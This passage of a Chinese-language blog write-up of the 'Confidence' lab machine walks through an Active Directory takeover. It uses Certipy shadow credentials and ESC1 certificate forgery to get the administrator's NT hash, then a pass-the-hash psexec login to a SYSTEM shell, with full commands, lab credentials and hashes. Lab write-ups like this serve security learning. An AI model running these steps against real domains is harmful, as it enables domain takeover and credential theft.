00S</span><br><span class="line">INFO: Compressing output into 20250911042039_bloodhound.zip</span><br><span class="line">放到里面</span><br></pre></td></tr></table></figure>

<p>发送hyh对ca-user用户有可写权限直接可以获取他的hash 通过影子凭证</p>
<p><img src="/../images/confidence/1.png" alt="nmap"></p>
<h4 id="影子凭证"><a href="#影子凭证" class="headerlink" title="影子凭证"></a>影子凭证</h4><p>certipy shadow auto -username <a href="mailto:&#x68;&#x79;&#x68;&#x40;&#x63;&#111;&#x6e;&#102;&#105;&#100;&#101;&#110;&#x63;&#101;&#46;&#99;&#111;&#109;">hyh@confidence.com</a> -password 3948571026 -account ca-user -target dc.confidence.com -dc-ip 192.168.10.132</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">source certipy-3.12-env/bin/activate 激活虚拟环境工具要求3.11</span><br><span class="line"></span><br><span class="line">└─# certipy shadow auto -username hyh@confidence.com -password 3948571026 -account ca-user -target dc.confidence.com -dc-ip 192.168.10.132</span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user &#x27;ca-user&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;6105a628c72a4425ae02b84c3ed67080&#x27;</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;6105a628c72a4425ae02b84c3ed67080&#x27; to the Key Credentials for &#x27;ca-user&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;6105a628c72a4425ae02b84c3ed67080&#x27; to the Key Credentials for &#x27;ca-user&#x27;</span><br><span class="line">[*] Authenticating as &#x27;ca-user&#x27; with the certificate</span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     No identities found in this certificate</span><br><span class="line">[*] Using principal: &#x27;ca-user@confidence.com&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to &#x27;ca-user.ccache&#x27;</span><br><span class="line">[*] Wrote credential cache to &#x27;ca-user.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;ca-user&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;ca-user&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;ca-user&#x27;</span><br><span class="line">[*] NT hash for &#x27;ca-user&#x27;: 8636734a8c71b741a33bcb2bf323ea5c</span><br></pre></td></tr></table></figure>

<p>获得了ca-user然后使用漏洞扫描扫描漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">└─# certipy find -username ca-user -hashes :8636734a8c71b741a33bcb2bf323ea5c -dc-ip 192.168.10.132 -vulnerable</span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Finding issuance policies</span><br><span class="line">[*] Found 17 issuance policies</span><br><span class="line">[*] Found 0 OIDs linked to templates</span><br><span class="line">[*] Retrieving CA configuration for &#x27;confidence-DC-CA&#x27; via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Successfully retrieved CA configuration for &#x27;confidence-DC-CA&#x27;</span><br><span class="line">[*] Checking web enrollment for CA &#x27;confidence-DC-CA&#x27; @ &#x27;dc.confidence.com&#x27;</span><br><span class="line">[!] Error checking web enrollment: timed out</span><br><span class="line">[!] Use -debug to print a stacktrace</span><br><span class="line">[!] Error checking web enrollment: timed out</span><br><span class="line">[!] Use -debug to print a stacktrace</span><br><span class="line">[*] Saving text output to &#x27;20250911052914_Certipy.txt&#x27;</span><br><span class="line">[*] Wrote text output to &#x27;20250911052914_Certipy.txt&#x27;</span><br><span class="line">[*] Saving JSON output to &#x27;20250911052914_Certipy.json&#x27;</span><br><span class="line">[*] Wrote JSON output to &#x27;20250911052914_Certipy.json&#x27;</span><br><span class="line"></span><br><span class="line">cat 20250911052914_Certipy.txt</span><br><span class="line">    [+] User Enrollable Principals      : CONFIDENCE.COM\Domain Computers</span><br><span class="line">                                          CONFIDENCE.COM\ca-admin</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : Enrollee supplies subject and template allows client authentication.</span><br><span class="line">发现漏洞ESC1</span><br></pre></td></tr></table></figure>

<h4 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h4><p>1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">└─# certipy req -u ca-user@confidence.com -hashes :8636734a8c71b741a33bcb2bf323ea5c \</span><br><span class="line">  -ca confidence-DC-CA -target dc.confidence.com \</span><br><span class="line">  -template ca-login \</span><br><span class="line">  -upn administrator@confidence.com \</span><br><span class="line">  -sid S-1-5-21-3649830887-1815587496-1699028491-500 \</span><br><span class="line">  -out administrator \</span><br><span class="line">  -dc-ip 192.168.10.132</span><br><span class="line"></span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 10</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@confidence.com&#x27;</span><br><span class="line">[*] Certificate object SID is &#x27;S-1-5-21-3649830887-1815587496-1699028491-500&#x27;</span><br><span class="line">[*] Saving certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">File &#x27;administrator.pfx&#x27; already exists. Overwrite? (y/n - saying no will save with a unique filename): </span><br><span class="line">[*] Wrote certificate and private key to &#x27;administrator_1abcd36f-ea00-404e-955c-50be33193359.pfx&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy req	certipy 的 “证书请求” 子命令，用于向域 CA 申请证书</span><br><span class="line">-u ca-user@confidence.com	指定用于请求证书的账号：域用户 ca-user（UPN 格式，confidence.com 为目标域）</span><br><span class="line">-hashes :8636734a8c71b741a33bcb2bf323ea5c	指定 ca-user 的 NTLM 哈希（: 前为空表示不使用 LM 哈希，仅用 NT 哈希；该哈希是 ca-user 的身份凭证，无需明文密码）</span><br><span class="line">-ca confidence-DC-CA	指定目标域的证书颁发机构（CA）名称：confidence-DC-CA（通常域控会作为 CA，格式为 “域 - 域控 - CA”）</span><br><span class="line">-target dc.confidence.com	指定证书请求的目标服务器：域控 dc.confidence.com（CA 服务运行在域控上）</span><br><span class="line">-template ca-login	指定用于请求证书的 “证书模板”：ca-login（需是域内可用于身份认证的模板，且 ca-user 有该模板的申请权限）</span><br><span class="line">-upn administrator@confidence.com	关键伪造参数：将证书的 “用户主体名（UPN）” 设为 administrator@confidence.com（即伪装成域管理员账号）</span><br><span class="line">-sid S-1-5-21-...-500	关键伪造参数：将证书关联的 SID 设为管理员的 SID（-500 是域管理员的默认 SID，确保证书被识别为管理员身份）</span><br><span class="line">-out administrator	指定输出文件前缀：生成的证书和私钥文件以 administrator 命名</span><br><span class="line">-dc-ip 192.168.10.132	指定域控的 IP 地址：避免 DNS 解析问题，直接通过 IP 连接域控</span><br></pre></td></tr></table></figure>

<p>2 获得NT hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─# certipy auth -pfx administrator_1abcd36f-ea00-404e-955c-50be33193359.pfx -dc-ip 192.168.10.132 </span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: &#x27;administrator@confidence.com&#x27;</span><br><span class="line">[*]     SAN URL SID: &#x27;S-1-5-21-3649830887-1815587496-1699028491-500&#x27;</span><br><span class="line">[*]     Security Extension SID: &#x27;S-1-5-21-3649830887-1815587496-1699028491-500&#x27;</span><br><span class="line">[*] Using principal: &#x27;administrator@confidence.com&#x27;</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">File &#x27;administrator.ccache&#x27; already exists. Overwrite? (y/n - saying no will save with a unique filename): </span><br><span class="line">[*] Wrote credential cache to &#x27;administrator_3460f055-68bf-49c8-a389-5a8afc641fee.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@confidence.com&#x27;: aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34</span><br><span class="line"></span><br><span class="line">certipy auth	certipy 的 “证书认证” 子命令，用于通过 PFX 证书完成 Kerberos 认证</span><br><span class="line">-pfx administrator_xxx.pfx	指定上一步生成的伪造证书文件（包含管理员身份的证书和私钥）</span><br><span class="line">-dc-ip 192.168.10.132	直接指定域控 IP，确保顺利连接</span><br></pre></td></tr></table></figure>

<p><strong>命令执行流程与结果</strong>：</p>
<ol>
<li><p><strong>证书身份验证</strong>：<code>certipy</code> 读取 PFX 文件中的证书，向域控证明 “自己是 administrator”（因证书的 UPN 和 SID 均为管理员信息）；</p>
</li>
<li><p><strong>获取 TGT</strong>：域控验证证书有效后，颁发 “票证授予票据（TGT）”（管理员权限的 TGT），并保存为 <code>administrator_xxx.ccache</code>（Kerberos 凭证缓存文件）；</p>
</li>
<li><p><strong>提取管理员哈希</strong>：利用管理员权限的 TGT，进一步从域控中读取 <code>administrator</code> 的 NT 哈希，最终输出结果：<br><code>aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34</code></p>
</li>
<li><p>先利用 <code>ca-user</code> 的权限（可能是之前通过 <code>GenericWrite</code> 获取的权限），申请一张 “伪装成管理员” 的证书；</p>
</li>
<li><p>再用这张伪造证书完成域认证，获取管理员权限的 Kerberos 凭证，最终提取出管理员的 NT 哈希；</p>
</li>
<li><p>拿到管理员哈希后，可进一步通过 <code>pass-the-hash</code>（哈希传递）直接登录域控，实现完全控制。</p>
</li>
</ol>
<p>登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">psexec.py administrator@192.168.10.132 -hashes aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34</span><br><span class="line"></span><br><span class="line">4</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 192.168.10.132.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file UTLKILTt.exe</span><br><span class="line">[*] Opening SVCManager on 192.168.10.132.....</span><br><span class="line">[*] Creating service bROc on 192.168.10.132.....</span><br><span class="line">[*] Starting service bROc.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">Microsoft Windows [�汾 10.0.20348.4052]</span><br><span class="line"></span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br></pre></td></tr></table></figure>



</article>
<div class="article-footer">
    <section id="license">
      <div class="header"><span>License</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    

</div>

<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/09/18/posts/halfhour/">Halfhour靶机-Maze-通配符漏洞</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/09/10/posts/mount/">Mount靶机-maze</a></div></section></div>






<footer class="page-footer footnote"><hr><div class="text"><center>本站由 Starrui777使用 Stellar 1.33.1 主题创建。 </center>
<center>
</br>
</br>
<script type="text/javascript">
function show_runtime() {
    window.setTimeout("show_runtime()", 1000);
    X = new Date("2/6/2026 14:57:10 ");
    Y = new Date();
    T = (Y.getTime() - X.getTime());
    M = 24 * 60 * 60 * 1000;
    a = T / M;
    A = Math.floor(a);
    b = (a - A) * 24;
    B = Math.floor(b);
    c = (b - B) * 60;
    C = Math.floor((b - B) * 60);
    D = Math.floor((c - C) * 60);
    runtime_span.innerHTML = "⏲️ 本站已运行 " + A + "天|" + B + "小时|" + C + "分|" + D + "秒 ⏲️"
}
show_runtime();
</script>
<span id="runtime_span"> </span>
</center>
<span class="totalcount"> 共发表 90 篇 Blog · </span> <span class="post-count"> 总计 77.8k 字 </span></div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Confidence%E9%9D%B6%E6%9C%BA-Maze-windows-ESC1"><span class="toc-text">Confidence靶机-Maze-windows-ESC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#userflag"><span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rootflag"><span class="toc-text">rootflag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E5%87%AD%E8%AF%81"><span class="toc-text">影子凭证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ESC1"><span class="toc-text">ESC1</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
</div></aside><div class='float-panel'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">


<script type="text/javascript">
  window.canonical = {"closeEnable":true,"closeText":"关闭提示","originalHost":null,"officialHosts":["localhost"],"encoded":""};
  window.canonical["param"] = {"permalink":"http://example.com/2025/09/12/posts/confidence/","checklink":"/js/plugins/video.js"};
  const ctx = {
    date_suffix: {
      just: `Just`,
      min: `minutes ago`,
      hour: `hours ago`,
      day: `days ago`,
    },
    root : `/`,
    tag_plugins: {
      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
    }
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
  };
  const deps = {
    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
    lazyload: `/%5Bobject%20Object%5D`
  }
  

</script>

<script type="text/javascript">
  
  function RunItem() {
    this.list = []; // 存放回调函数
    this.start = () => {
      for (var i = 0; i < this.list.length; i++) {
        this.list[i].run();
      }
    };
    this.push = (fn, name, setRequestAnimationFrame = true) => {
      let myfn = fn
      if (setRequestAnimationFrame) {
        myfn = () => {
          utils.requestAnimationFrame(fn)
        }
      }
      var f = new Item(myfn, name);
      this.list.push(f);
    };
    this.remove = (name) => {
      for (let index = 0; index < this.list.length; index++) {
        const e = this.list[index];
        if (e.name == name) {
          this.list.splice(index, 1);
        }
      }
    }
    // 构造一个可以run的对象
    function Item(fn, name) {
      // 函数名称
      this.name = name || fn.name;
      // run方法
      this.run = () => {
        try {
          fn()
        } catch (error) {
          console.log(error);
        }
      };
    }
  }

  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')) {
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function () {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },

    onLoading: (el) => {
      if (el) {
        if ($(el).find('.loading-wrap').length == 0){
          $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
        }
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      const maxRetry = 3;
      let retryCount = 0;

      return new Promise((resolve, reject) => {
        const load = () => {
          utils.onLoading?.(el);

          let timedOut = false;
          const timeout = setTimeout(() => {
            timedOut = true;
            console.warn('[request] 超时:', url);

            if (++retryCount >= maxRetry) {
              utils.onLoadFailure?.(el);
              onFailure?.();
              reject('请求超时');
            } else {
              setTimeout(load, 1000);
            }
          }, 5000);

          fetch(url).then(resp => {
            if (timedOut) return;
            clearTimeout(timeout);

            if (!resp.ok) throw new Error('响应失败');
            return resp;
          }).then(data => {
            if (timedOut) return;
            utils.onLoadSuccess?.(el);
            callback(data);
            resolve(data);
          }).catch(err => {
            clearTimeout(timeout);
            console.warn('[request] 错误:', err);

            if (++retryCount >= maxRetry) {
              utils.onLoadFailure?.(el);
              onFailure?.();
              reject(err);
            } else {
              setTimeout(load, 1000);
            }
          });
        };

        load();
      });
    },
    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
      return new Promise((resolve, reject) => {
        let retryCount = 0;

        const tryRequest = () => {
          let timedOut = false;
          const timer = setTimeout(() => {
            timedOut = true;
            if (++retryCount > maxRetry) reject('timeout');
            else tryRequest();
          }, timeout);

          fetch(url, options)
            .then(resp => {
              clearTimeout(timer);
              if (!resp.ok) throw new Error('bad response');
              resolve(resp);
            })
            .catch(err => {
              clearTimeout(timer);
              if (++retryCount > maxRetry) reject(err);
              else setTimeout(tryRequest, 500);
            });
        };

        tryRequest();
      });
    },
    /********************** requestAnimationFrame ********************************/
    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
    requestAnimationFrame: (fn) => {
      if (!window.requestAnimationFrame) {
        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
      }
      window.requestAnimationFrame(fn)
    },
    dark: {},
  };

  // utils.dark.mode 当前模式 dark or light
  // utils.dark.toggle() 暗黑模式触发器
  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
  utils.dark.method = {
    toggle: new RunItem(),
  };
  utils.dark = Object.assign(utils.dark, {
    push: utils.dark.method.toggle.push,
  });
</script>
<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>
<script type="text/javascript">
  (() => {
    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
    for (const tagSwitcher of tagSwitchers) {
      tagSwitcher.addEventListener('click', (e) => {
        const parent = e.target.closest('.tag-subtree.parent-tag')
        parent.classList.toggle('expanded')
        e.preventDefault()
      })
    }

    // Get active tag from query string, then activate it.
    const urlParams = new URLSearchParams(window.location.search)
    const activeTag = urlParams.get('tag')
    if (activeTag) {
      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
      if (tag) {
        tag.querySelector('a').classList.add('active')
        
        while (tag) {
          tag.classList.add('expanded')
          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
        }
      }
    }
  })()
</script>

<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
    callback_loaded: (el) => {
      el.classList.add('loaded');
      const wrapper = el.closest('.lazy-box');
      const icon = wrapper?.querySelector('.lazy-icon');
      if (icon) icon.remove();
    }
  };
  // Listen to the initialization event
